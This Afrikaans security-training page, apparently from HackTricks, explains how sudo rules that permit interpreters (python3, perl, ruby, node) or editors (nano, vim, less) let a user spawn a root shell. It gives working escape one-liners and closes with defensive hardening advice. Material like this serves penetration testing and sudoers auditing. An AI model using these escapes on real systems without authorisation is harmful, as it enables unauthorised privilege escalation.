# Misbruik van Sudo-opdragte

{{#include ../../banners/hacktricks-training.md}}

## Deur Sudo-toegelate interpreters

As `sudo -l` ’n gebruiker toelaat om ’n interpreter as root uit te voer, behandel dit as direkte code execution. Interpreters is ontwerp om arbitrêre code uit te voer, dus is ’n reël wat `python3`, `perl`, `ruby`, `lua`, `node` of soortgelyke binaries toelaat, gewoonlik gelykstaande aan root command execution, tensy die arguments streng beperk en gevalideer word.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Algemene review-vloei: lys eers die gebruiker se privileges, en voer dan ’n Python-stelling uit met die interpreter se `-c`-opsie.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Ander interpreter-voorbeelde word hieronder getoon; die gelyste interpreters dokumenteer inline-code-uitvoering of child-process-API's.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Die presiese pad is belangrik. Indien die sudo-reël `/usr/bin/python3` toelaat, gebruik daardie presiese pad tydens validering.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors wat deur sudo toegelaat word

As `sudo -l` ’n gebruiker toelaat om ’n interactive editor as root uit te voer, hanteer dit as ’n command-execution-oppervlak, nie as ’n onskadelike lêerbewerkings-toestemming nie. Editors kan dikwels shell commands uitvoer, arbitrêre lêers lees, arbitrêre lêers skryf, of external helpers vanuit die editor aanroep.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Algemene review-flow: lys die gebruiker se privileges, en voer daarna elke toegelate editor of pager met sudo uit.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

Wanneer `nano` deur sudo toegelaat word, kan command execution vanaf die editor-koppelvlak bereikbaar wees.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Verskaf dan 'n opdrag soos `id` of `/bin/sh` by die nano-opdragprompt.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
As ’n interaktiewe shell nie bruikbare terminal streams het nie, karteer hierdie herleidingsvorm sy standaarduitvoer en -fout na deskriptor 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Die presiese sleutelvolgorde kan wissel na gelang van nano-weergawe en build-opsies, maar die veiligheidskwessie is dieselfde: die redigeerder loop as root en kan eksterne opdragte uitvoer.<sup>[[1]](#references)[[12]](#references)</sup>

### Ander algemene redigeerder-ontsnappings

Vim-styl-redigeerders stel gewoonlik command execution deur middel van `:!` bloot.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Pagers soos `less` kan ook shell execution blootstel.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Defensiewe notas

- Vermy die toekenning van interpreters of interaktiewe editors deur sudo.<sup>[[1]](#references)</sup>
- Verkies vaste, root-owned wrappers wat een beperkte administratiewe handeling uitvoer.<sup>[[1]](#references)[[2]](#references)</sup>
- Indien ’n interpreter onvermydelik is, beperk die presiese script-pad en voorkom gebruikerbeheerde argumente, skryfbare imports, `PYTHONPATH`, en onveilige omgewingsbewaring.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Indien lêerredigering vereis word, beperk die presiese lêerpad en oorweeg `sudoedit` met gelapte sudo-weergawes en streng omgewingshantering.<sup>[[1]](#references)[[2]](#references)</sup>
- Hersien `SETENV`, `env_keep`, skryfbare werkgidse, skryfbare module/import-paaie, `NOEXEC`, `use_pty`, en logging, maar moenie dit as ’n volledige sandbox beskou nie.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Python-dokumentasie](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Verskeie bedryfstelsel-koppelvlakke — Python-dokumentasie](https://docs.python.org/3/library/os.html)
- [5] [perlrun — hoe om die Perl-interpreter uit te voer](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl-dokumentasie](https://perldoc.perl.org/functions/exec)
- [7] [Ruby-opdragreëlopsies](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby-dokumentasie](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Node.js-dokumentasie](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js-dokumentasie](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua-handleidingbladsy](https://www.lua.org/manual/5.4/lua.html)
- [12] [Die GNU nano-tekseditor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash-verwysingshandleiding](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
